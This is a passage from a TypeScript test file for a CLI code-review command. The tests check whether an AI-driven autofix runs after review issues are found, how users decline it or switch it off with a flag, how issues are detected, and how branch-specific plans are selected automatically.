        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: () => 'test review prompt',
      detectIssuesInReview: (reviewResult: any, rawOutput: string) => {
        return rawOutput.includes('Major Issues');
      },
      buildAutofixPrompt: (planData: any, reviewResult: any, diffResult: any) => {
        return `# Autofix Request for ${planData.title}`;
      },
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Call without autofix flag - should prompt user and execute autofix
    await handleReviewCommand(planFile, {}, mockCommand);

    // Should execute both review and autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(2);
  });

  test('respects user declining autofix prompt', async () => {
    const planContent = `
id: 125
title: Test Declined Autofix
goal: Test user declining autofix
tasks:
  - title: Test task
    description: A test task with issues
`;
    const planFile = join(testDir, 'decline-test.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          return JSON.stringify({
            issues: [
              {
                severity: 'minor',
                category: 'style',
                content: 'Style - Missing documentation',
                file: 'src/utils.ts',
                line: '25',
                suggestion: 'Add JSDoc comments',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        }
        // Should not be called for autofix
        throw new Error('Autofix should not be executed when user declines');
      }),
    };

    // Mock the confirm function to return false (user declines autofix)
    // Also mock checkbox in case it's called (shouldn't be if confirm returns false)
    await moduleMocker.mock('@inquirer/prompts', () => ({
      select: mock(async ({ message }: { message: string }) => {
        expect(message).toContain('Issues were found during review');
        return 'exit';
      }),
    }));

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 125,
        title: 'Test Declined Autofix',
        goal: 'Test user declining autofix',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task with issues',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: () => 'test review prompt',
      detectIssuesInReview: (reviewResult: any, rawOutput: string) => {
        return rawOutput.includes('Minor Issues');
      },
      buildAutofixPrompt: (planData: any, reviewResult: any, diffResult: any) => {
        throw new Error('buildAutofixPrompt should not be called when user declines');
      },
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, {}, mockCommand);

    // Should only execute review, not autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledWith(
      'test review prompt',
      expect.objectContaining({
        executionMode: 'review',
      })
    );
  });

  test('no prompt or autofix when no issues found', async () => {
    const planContent = `
id: 126
title: Test No Issues
goal: Test no autofix when no issues
tasks:
  - title: Test task
    description: A clean test task
`;
    const planFile = join(testDir, 'no-issues-test.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          // Return review output with no issues
          return JSON.stringify({
            issues: [],
            recommendations: ['Continue following current coding standards and best practices.'],
            actionItems: [],
          });
        }
        throw new Error('Autofix should not be executed when no issues found');
      }),
    };

    // Mock confirm to throw if called (it shouldn't be)
    // Also mock checkbox to throw if called (it shouldn't be)
    await moduleMocker.mock('@inquirer/prompts', () => ({
      confirm: mock(async () => {
        throw new Error('Confirm should not be called when no issues found');
      }),
      checkbox: mock(async () => {
        throw new Error('Checkbox should not be called when no issues found');
      }),
    }));

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 126,
        title: 'Test No Issues',
        goal: 'Test no autofix when no issues',
        tasks: [
          {
            title: 'Test task',
            description: 'A clean test task',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: () => 'test review prompt',
      detectIssuesInReview: (reviewResult: any, rawOutput: string) => {
        // No issues found - the review output indicates all is well
        return false;
      },
      buildAutofixPrompt: (planData: any, reviewResult: any, diffResult: any) => {
        throw new Error('buildAutofixPrompt should not be called when no issues found');
      },
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Test both with and without autofix flag - should behave the same (no autofix)
    await handleReviewCommand(planFile, {}, mockCommand);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);

    // Reset mock and test with autofix flag
    mockExecutor.execute.mockClear();
    await handleReviewCommand(planFile, { autofix: true }, mockCommand);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('no-autofix flag prevents autofix even when issues found', async () => {
    const planContent = `
id: 127
title: Test No-Autofix Flag
goal: Test no-autofix flag prevention
tasks:
  - title: Test task
    description: A test task with issues
`;
    const planFile = join(testDir, 'no-autofix-test.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          return JSON.stringify({
            issues: [
              {
                severity: 'critical',
                category: 'security',
                content: 'Security - SQL injection vulnerability',
                file: 'src/db.ts',
                line: '55',
                suggestion: 'Use parameterized queries',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        }
        throw new Error('Autofix should not be executed with --no-autofix flag');
      }),
    };

    // Mock confirm to throw if called (it shouldn't be with --no-autofix)
    // Also mock checkbox to throw if called (it shouldn't be with --no-autofix)
    await moduleMocker.mock('@inquirer/prompts', () => ({
      confirm: mock(async () => {
        throw new Error('Confirm should not be called with --no-autofix flag');
      }),
      checkbox: mock(async () => {
        throw new Error('Checkbox should not be called with --no-autofix flag');
      }),
    }));

    await moduleMocker.mock('../plans.js', () => ({
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 127,
        title: 'Test No-Autofix Flag',
        goal: 'Test no-autofix flag prevention',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task with issues',
          },
        ],
      }),
    }));

    // Short-circuit context gathering to avoid touching real git and IO
    await moduleMocker.mock('../utils/context_gathering.js', () => ({
      gatherPlanContext: async () => ({
        resolvedPlanFile: planFile,
        planData: {
          id: 127,
          title: 'Test No-Autofix Flag',
          goal: 'Test no-autofix flag prevention',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task with issues',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
      // Avoid invoking real git in tests
      getCurrentCommitHash: async () => 'deadbeef',
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: () => 'test review prompt',
      detectIssuesInReview: (reviewResult: any, rawOutput: string) => {
        return rawOutput.includes('Critical Issues');
      },
      buildAutofixPrompt: (planData: any, reviewResult: any, diffResult: any) => {
        throw new Error('buildAutofixPrompt should not be called with --no-autofix flag');
      },
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, { noAutofix: true }, mockCommand);

    // Should only execute review, not autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledWith(
      'test review prompt',
      expect.objectContaining({
        executionMode: 'review',
      })
    );
  });

  test('detectIssuesInReview - detects issues via totalIssues count', () => {
    const reviewResult = {
      summary: { totalIssues: 2 },
      issues: [],
    } as any;

    const result = detectIssuesInReview(reviewResult, 'Some review output');
    expect(result).toBe(true);
  });

  test('detectIssuesInReview - detects issues via issues array', () => {
    const reviewResult = {
      summary: { totalIssues: 0 },
      issues: [{ id: 'test-issue', title: 'Test Issue' }],
    } as any;

    const result = detectIssuesInReview(reviewResult, 'Some review output');
    expect(result).toBe(true);
  });

  test('detectIssuesInReview - semantic fallback detection with issue indicators', () => {
    const reviewResult = {
      summary: { totalIssues: 0 },
      issues: [],
    } as any;

    const rawOutput = `## Code Review Summary

Several issues were found during the review:
- Critical security vulnerability in authentication
- Performance problem with database queries
- Bug in error handling logic

These issues need to be addressed before merging.`;

    const result = detectIssuesInReview(reviewResult, rawOutput);
    expect(result).toBe(true);
  });

  test('detectIssuesInReview - semantic fallback with list structure', () => {
    const reviewResult = {
      summary: { totalIssues: 0 },
      issues: [],
    } as any;

    const rawOutput = `Review Results:

1. Memory leak in component lifecycle
2. Missing error handling in API calls
3. Performance bottleneck in rendering

Recommendations for fixes are provided below.`;

    const result = detectIssuesInReview(reviewResult, rawOutput);
    expect(result).toBe(true);
  });

  test('detectIssuesInReview - no issues detected when clean', () => {
    const reviewResult = {
      summary: { totalIssues: 0 },
      issues: [],
    } as any;

    const rawOutput = `## Code Review Summary

The code review has been completed successfully.
No issues were identified in the implementation.
The code follows best practices and coding standards.
All tests are passing and functionality works as expected.`;

    const result = detectIssuesInReview(reviewResult, rawOutput);
    expect(result).toBe(false);
  });

  test('detectIssuesInReview - handles null/undefined inputs safely', () => {
    expect(detectIssuesInReview(null as any, '')).toBe(false);
    expect(detectIssuesInReview(undefined as any, '')).toBe(false);
    expect(detectIssuesInReview({} as any, '')).toBe(false);
    expect(detectIssuesInReview({ summary: {} } as any, '')).toBe(false);
  });

  test('buildAutofixPrompt - validates required inputs', () => {
    const validPlanData = {
      id: 42,
      title: 'Test Plan',
      goal: 'Test goal',
      tasks: [],
    };

    const validReviewResult = {
      issues: [{ title: 'Test Issue', description: 'Test description' }],
      rawOutput: 'Test output',
    } as any;

    const validDiffResult = {
      baseBranch: 'main',
      changedFiles: ['test.ts'],
    } as any;

    // Test null planData
    expect(() => buildAutofixPrompt(null as any, validReviewResult, validDiffResult)).toThrow(
      'planData is required for autofix prompt generation'
    );

    // Test null reviewResult
    expect(() => buildAutofixPrompt(validPlanData, null as any, validDiffResult)).toThrow(
      'reviewResult is required for autofix prompt generation'
    );

    // Test null diffResult
    expect(() => buildAutofixPrompt(validPlanData, validReviewResult, null as any)).toThrow(
      'diffResult is required for autofix prompt generation'
    );

    // Test valid inputs
    expect(() =>
      buildAutofixPrompt(validPlanData, validReviewResult, validDiffResult)
    ).not.toThrow();
  });

  test('buildAutofixPrompt creates proper autofix prompt structure', async () => {
    const planData = {
      id: 42,
      title: 'Test Plan',
      goal: 'Test autofix prompt building',
      details: 'This plan tests the autofix prompt structure',
      tasks: [
        {
          title: 'Fix security issues',
          description: 'Address security vulnerabilities',
        },
        {
          title: 'Improve performance',
          description: 'Optimize slow queries',
        },
      ],
    };

    const mockReviewResult = {
      planId: '42',
      planTitle: 'Test Plan',
      reviewTimestamp: '2024-01-01T00:00:00.000Z',
      baseBranch: 'main',
      changedFiles: ['src/auth.ts', 'src/db.ts'],
      summary: {
        totalIssues: 2,
        criticalCount: 1,
        majorCount: 1,
        minorCount: 0,
        infoCount: 0,
        categoryCounts: {
          security: 1,
          performance: 1,
          bug: 0,
          style: 0,
          compliance: 0,
          testing: 0,
          other: 0,
        },
        filesReviewed: 2,
        overallRating: 'fair' as const,
      },
      issues: [
        {
          id: 'sec-001',
          severity: 'critical' as const,
          category: 'security' as const,
          content: 'SQL Injection vulnerability - User input not properly sanitized',
          file: 'src/auth.ts',
          line: 42,
          suggestion: 'Use parameterized queries',
        },
        {
          id: 'perf-001',
          severity: 'major' as const,
          category: 'performance' as const,
          content: 'N+1 query problem - Inefficient database queries in loop',
          file: 'src/db.ts',
          line: 15,
          suggestion: 'Use batch queries or eager loading',
        },
      ],
      rawOutput: 'Mock review output',
      recommendations: ['Use parameterized queries', 'Optimize database access'],
      actionItems: ['Fix SQL injection', 'Implement batch queries'],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/auth.ts', 'src/db.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff content',
    };

    // Import the buildAutofixPrompt function directly for testing
    const { buildAutofixPrompt } = await import('./review.js');
    const autofixPrompt = buildAutofixPrompt(planData, mockReviewResult, diffResult);

    // Verify the prompt structure
    expect(autofixPrompt).toContain('# Autofix Request');
    expect(autofixPrompt).toContain('## Plan Context');
    expect(autofixPrompt).toContain('**Plan ID:** 42');
    expect(autofixPrompt).toContain('**Title:** Test Plan');
    expect(autofixPrompt).toContain('**Goal:** Test autofix prompt building');
    expect(autofixPrompt).toContain('**Details:**');
    expect(autofixPrompt).toContain('This plan tests the autofix prompt structure');

    // Verify tasks are included
    expect(autofixPrompt).toContain('**Tasks:**');
    expect(autofixPrompt).toContain('1. **Fix security issues**');
    expect(autofixPrompt).toContain('Address security vulnerabilities');
    expect(autofixPrompt).toContain('2. **Improve performance**');
    expect(autofixPrompt).toContain('Optimize slow queries');

    // Verify issues are included
    expect(autofixPrompt).toContain('## Review Findings');
    expect(autofixPrompt).toContain('SQL Injection vulnerability');
    expect(autofixPrompt).toContain('N+1 query problem');
    expect(autofixPrompt).toContain('src/auth.ts');
    expect(autofixPrompt).toContain('src/db.ts');
    expect(autofixPrompt).toContain('critical');
    expect(autofixPrompt).toContain('major');

    // Verify instructions are included
    expect(autofixPrompt).toContain('## Instructions');
    expect(autofixPrompt).toContain('Please fix all the issues identified in the review');
    expect(autofixPrompt).toContain('maintaining the plan requirements');
  });
});

describe('Auto-selection of branch-specific plans', () => {
  test('auto-selects plan when no planFile provided and branch-specific plan exists', async () => {
    const planContent = `
id: 42
title: Branch-specific Plan
goal: Test auto-selection functionality
createdAt: 2024-01-01T00:00:00.000Z
tasks:
  - title: Test task
    description: A test task on this branch
`;

    const planFile = join(testDir, 'branch-plan.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async (prompt: string, metadata: any) => {
        return JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        });
      }),
    };

    // Mock findBranchSpecificPlan to return a plan
    await moduleMocker.mock('../plans.js', () => ({
      findBranchSpecificPlan: mock(async () => ({
        id: 42,
        title: 'Branch-specific Plan',
        goal: 'Test auto-selection functionality',
        createdAt: '2024-01-01T00:00:00.000Z',
        filename: planFile,
        tasks: [
          {
            title: 'Test task',
            description: 'A test task on this branch',
          },
        ],
      })),
      // Keep other needed functions
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 42,
        title: 'Branch-specific Plan',
        goal: 'Test auto-selection functionality',
        createdAt: '2024-01-01T00:00:00.000Z',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task on this branch',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        defaultExecutor: 'claude-code',
      }),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: () => 'test review prompt',
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Call without planFile - should auto-select
    await handleReviewCommand(undefined, {}, mockCommand);

    // Verify the executor was called
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('throws error when no planFile provided and no branch-specific plans exist', async () => {
    // Mock both branch-specific and modified plan finders to return null
    await moduleMocker.mock('../plans.js', () => ({
      findBranchSpecificPlan: mock(async () => null),
      findSingleModifiedPlanOnBranch: mock(async () => null),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({}),
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(undefined, {}, mockCommand)).rejects.toThrow(
      'No plan file specified and no suitable plans found'
    );
  });

  test('still works with explicit planFile when provided', async () => {
    const planContent = `
id: 1
title: Explicit Plan
goal: Test explicit plan selection
tasks:
  - title: Test task
    description: A test task
`;
    const planFile = join(testDir, 'explicit-plan.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async () =>
        JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        })
      ),
    };

    // Mock findBranchSpecificPlan - should NOT be called when planFile is provided
    await moduleMocker.mock('../plans.js', () => ({
      findBranchSpecificPlan: mock(async () => {
        throw new Error('findBranchSpecificPlan should not be called when planFile is provided');
      }),
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 1,
        title: 'Explicit Plan',
        goal: 'Test explicit plan selection',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({}),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: () => 'test prompt',
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Call with explicit planFile - should NOT trigger auto-selection
    await handleReviewCommand(planFile, {}, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('includes auto-selection logging in output', async () => {
    const planContent = `
id: 100
title: Auto-selected Plan
goal: Test auto-selection logging
tasks:
  - title: Test task
    description: A test task for logging
`;
    const planFile = join(testDir, 'auto-selected-plan.yml');
    await writeFile(planFile, planContent);

    const mockExecutor = {
      execute: mock(async () =>
        JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        })
      ),
    };

    // Capture log calls to verify auto-selection messages
    const logCalls: string[] = [];
    const mockLog = mock((message: string) => {
      logCalls.push(message);
    });

    await moduleMocker.mock('../plans.js', () => ({
      findBranchSpecificPlan: mock(async () => ({
        id: 100,
        title: 'Auto-selected Plan',
        goal: 'Test auto-selection logging',
        filename: planFile,
        tasks: [
          {
            title: 'Test task',
            description: 'A test task for logging',
          },
        ],
      })),
      resolvePlanFile: async () => planFile,
      readPlanFile: async () => ({
        id: 100,
        title: 'Auto-selected Plan',
        goal: 'Test auto-selection logging',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task for logging',
          },
        ],
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({}),
    }));

    await moduleMocker.mock('../executors/index.js', () => ({
      buildExecutorAndLog: () => mockExecutor,
      DEFAULT_EXECUTOR: 'codex-cli',
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    // Mock the log function to capture calls
    await moduleMocker.mock('../../logging.js', () => ({
      log: mockLog,
    }));

    await moduleMocker.mock('./review.js', () => ({
      handleReviewCommand,
      generateDiffForReview: async () => ({
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'test diff',
      }),
      buildReviewPrompt: () => 'test prompt',
    }));

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(undefined, {}, mockCommand);

    // Verify auto-selection logging occurred
    const autoSelectionLogs = logCalls.filter(
      (msg) => msg.includes('Auto-selected plan') || msg.includes('100 - Auto-selected Plan')
    );
    expect(autoSelectionLogs.length).toBeGreaterThan(0);
  });
});

// TODO Not properly mocking somewhere. Try to replace with real temp dir
describe.skip('Branch-specific plan discovery', () => {
  test('getNewPlanFilesOnBranch finds new plan files using git', async () => {
    // Import the function to test it directly
    const { getNewPlanFilesOnBranch } = await import('../plans.js');

    await moduleMocker.mock('../../common/git.js', () => ({
      getTrunkBranch: async () => 'main',
      getUsingJj: async () => false,
    }));

    await moduleMocker.mock('bun', () => ({
      $: mock().mockImplementation((template: TemplateStringsArray) => {
        const command = template.join('');
        if (command.includes('git diff --name-status')) {
          return {
            cwd: mock(() => ({
              nothrow: () => ({
                text: () => 'A\tsome/plan.yml\nA\tother/file.txt\nM\texisting.yml',
              }),
            })),
            nothrow: mock(() => ({
              text: () => 'A\tsome/plan.yml\nA\tother/file.txt\nM\texisting.yml',
            })),
            text: mock(() => 'A\tsome/plan.yml\nA\tother/file.txt\nM\texisting.yml'),
          };
        }
        return {
          cwd: mock(() => ({ nothrow: () => ({ text: () => '' }) })),
          nothrow: mock(() => ({ text: () => '' })),
          text: mock(() => ''),
        };
      }),
    }));

    const result = await getNewPlanFilesOnBranch('/test/repo', '/test/repo');
    expect(result).toContain('/test/repo/some/plan.yml');
    expect(result).not.toContain('/test/repo/other/file.txt'); // Not a plan file
    expect(result).not.toContain('/test/repo/existing.yml'); // Modified, not added
  });

  test('getNewPlanFilesOnBranch finds new plan files using jj', async () => {
    const { getNewPlanFilesOnBranch } = await import('../plans.js');

    await moduleMocker.mock('../../common/git.js', () => ({
      getTrunkBranch: async () => 'main',
      getUsingJj: async () => true,
    }));

    await moduleMocker.mock('bun', () => ({
      $: mock().mockImplementation((template: TemplateStringsArray) => {
        const command = template.join('');
        if (command.includes('jj diff --from')) {
          return {
            cwd: mock(() => ({
              nothrow: () => ({
                text: () =>
                  '-F tasks/new-plan.yml\n-F tasks/another.plan.md\nFF existing/modified.yml',
              }),
            })),
            nothrow: mock(() => ({
              text: () =>
                '-F tasks/new-plan.yml\n-F tasks/another.plan.md\nFF existing/modified.yml',
            })),
            text: mock(
              () => '-F tasks/new-plan.yml\n-F tasks/another.plan.md\nFF existing/modified.yml'
            ),
          };
        }
        return {
          cwd: mock(() => ({ nothrow: () => ({ text: () => '' }) })),
          nothrow: mock(() => ({ text: () => '' })),
          text: mock(() => ''),
        };
      }),
    }));

    const result = await getNewPlanFilesOnBranch('/test/repo', '/test/repo/tasks');
    expect(result).toContain('/test/repo/tasks/new-plan.yml');
    expect(result).toContain('/test/repo/tasks/another.plan.md');
    expect(result).not.toContain('/test/repo/existing/modified.yml'); // Not a new file
  });

  test('findBranchSpecificPlan sorts by createdAt then by ID', async () => {
    const { findBranchSpecificPlan } = await import('../plans.js');

    // Mock plans with different timestamps and IDs
    const plan1File = join(testDir, 'plan1.yml');
    const plan2File = join(testDir, 'plan2.yml');
    const plan3File = join(testDir, 'plan3.yml');

    await moduleMocker.mock('../plans.js', () => ({
      findBranchSpecificPlan,
      getNewPlanFilesOnBranch: mock(async () => [plan1File, plan2File, plan3File]),
      readPlanFile: mock(async (filePath: string) => {
        if (filePath === plan1File) {
          return {
            id: 3,
            title: 'Plan 3',
            goal: 'Third plan',
            createdAt: '2024-01-03T00:00:00.000Z', // Newest
          };
        } else if (filePath === plan2File) {
          return {
            id: 1,
            title: 'Plan 1',
            goal: 'First plan',
            createdAt: '2024-01-01T00:00:00.000Z', // Oldest
          };
        } else if (filePath === plan3File) {
          return {
            id: 2,
            title: 'Plan 2',
            goal: 'Second plan',
            createdAt: '2024-01-02T00:00:00.000Z', // Middle
          };
        }
        return null;
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        paths: { tasks: testDir },
      }),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    const result = await findBranchSpecificPlan();

    // Should select plan with earliest createdAt (plan1 with 2024-01-01)
    expect(result?.id).toBe(1);
    expect(result?.title).toBe('Plan 1');
  });

  test('findBranchSpecificPlan falls back to ID sorting when createdAt missing', async () => {
    const { findBranchSpecificPlan } = await import('../plans.js');

    const plan1File = join(testDir, 'plan1.yml');
    const plan2File = join(testDir, 'plan2.yml');

    await moduleMocker.mock('../plans.js', () => ({
      findBranchSpecificPlan,
      getNewPlanFilesOnBranch: mock(async () => [plan1File, plan2File]),
      readPlanFile: mock(async (filePath: string) => {
        if (filePath === plan1File) {
          return {
            id: 5,
            title: 'Plan 5',
            goal: 'Higher ID plan',
            // No createdAt
          };
        } else if (filePath === plan2File) {
          return {
            id: 2,
            title: 'Plan 2',
            goal: 'Lower ID plan',
            // No createdAt
          };
        }
        return null;
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        paths: { tasks: testDir },
      }),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    const result = await findBranchSpecificPlan();

    // Should select plan with lowest ID (plan2 with ID 2)
    expect(result?.id).toBe(2);
    expect(result?.title).toBe('Plan 2');
  });

  test('findSingleModifiedPlanOnBranch returns plan when exactly one modified', async () => {
    const { findSingleModifiedPlanOnBranch } = await import('../plans.js');

    const modifiedPlanFile = join(testDir, 'modified-plan.yml');

    await moduleMocker.mock('../plans.js', () => ({
      findSingleModifiedPlanOnBranch,
      getModifiedPlanFilesOnBranch: mock(async () => [modifiedPlanFile]),
      readPlanFile: mock(async (filePath: string) => {
        if (filePath === modifiedPlanFile) {
          return {
            id: 42,
            title: 'Modified Plan',
            goal: 'Plan that was modified on this branch',
          };
        }
        return null;
      }),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        paths: { tasks: testDir },
      }),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    const result = await findSingleModifiedPlanOnBranch();

    expect(result).not.toBeNull();
    expect(result?.id).toBe(42);
    expect(result?.title).toBe('Modified Plan');
    expect(result?.filename).toBe(modifiedPlanFile);
  });

  test('findSingleModifiedPlanOnBranch returns null when multiple plans modified', async () => {
    const { findSingleModifiedPlanOnBranch } = await import('../plans.js');

    const plan1File = join(testDir, 'modified-plan1.yml');
    const plan2File = join(testDir, 'modified-plan2.yml');

    await moduleMocker.mock('../plans.js', () => ({
      findSingleModifiedPlanOnBranch,
      getModifiedPlanFilesOnBranch: mock(async () => [plan1File, plan2File]),
      readPlanFile: mock(async () => ({
        id: 1,
        title: 'Some Plan',
        goal: 'Some goal',
      })),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        paths: { tasks: testDir },
      }),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    const result = await findSingleModifiedPlanOnBranch();

    expect(result).toBeNull();
  });

  test('findSingleModifiedPlanOnBranch returns null when no plans modified', async () => {
    const { findSingleModifiedPlanOnBranch } = await import('../plans.js');

    await moduleMocker.mock('../plans.js', () => ({
      findSingleModifiedPlanOnBranch,
      getModifiedPlanFilesOnBranch: mock(async () => []),
      readPlanFile: mock(async () => null),
    }));

    await moduleMocker.mock('../configLoader.js', () => ({
      loadEffectiveConfig: async () => ({
        paths: { tasks: testDir },
      }),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getGitRoot: async () => testDir,
    }));

    const result = await findSingleModifiedPlanOnBranch();

    expect(result).toBeNull();
  });

  test('getModifiedPlanFilesOnBranch detects modified files in git', async () => {
    const { getModifiedPlanFilesOnBranch } = await import('../plans.js');

    await moduleMocker.mock('bun', () => ({
      $: mock().mockImplementation((template: TemplateStringsArray) => {
        const command = template.join('');
        if (command.includes('git diff --name-status')) {
          return {
            cwd: mock(() => ({
              nothrow: () => ({
                text: () =>
                  'M\ttasks/modified-plan.yml\nM\ttasks/another.plan.md\nA\ttasks/new.yml',
              }),
            })),
            nothrow: mock(() => ({
              text: () => 'M\ttasks/modified-plan.yml\nM\ttasks/another.plan.md\nA\ttasks/new.yml',
            })),
            text: mock(
              () => 'M\ttasks/modified-plan.yml\nM\ttasks/another.plan.md\nA\ttasks/new.yml'
            ),
          };
        }
        return {
          cwd: mock(() => ({ nothrow: () => ({ text: () => '' }) })),
          nothrow: mock(() => ({ text: () => '' })),
          text: mock(() => ''),
        };
      }),
    }));

    await moduleMocker.mock('../../common/git.js', () => ({
      getTrunkBranch: async () => 'main',
